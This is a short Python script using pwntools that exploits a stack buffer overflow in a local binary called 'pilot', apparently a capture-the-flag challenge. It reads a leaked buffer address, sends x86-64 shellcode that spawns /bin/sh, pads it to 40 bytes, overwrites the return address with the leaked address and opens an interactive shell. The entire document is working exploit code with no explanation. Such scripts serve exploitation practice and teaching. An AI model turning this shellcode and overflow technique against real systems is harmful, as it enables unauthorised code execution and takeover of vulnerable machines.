from pwn import *

target = process('./pilot')

# wait until the program gives it's buffer location
print(target.recvuntil('[*]Location:'))
leak_addr = target.recvline()
input_addr = int(leak_addr.decode().strip("\n"), 16)

# first put the shell code
payload =  b'\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05'
payload += bytes([0] * (40 - len(payload)))
payload += p64(input_addr)

target.send(payload)
target.interactive()